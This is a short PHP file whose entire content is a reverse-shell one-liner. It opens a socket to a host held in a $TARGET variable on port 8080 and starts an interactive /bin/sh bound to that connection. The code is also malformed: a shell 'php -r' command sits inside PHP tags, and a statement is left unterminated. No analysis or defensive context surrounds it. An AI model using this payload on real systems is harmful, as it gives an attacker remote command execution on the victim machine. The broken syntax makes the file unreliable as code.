<?php
$TARGET = ""
php -r '$sock=fsockopen($TARGET, 8080);exec("/bin/sh -i <&3 >&3 2>&3");'
?>
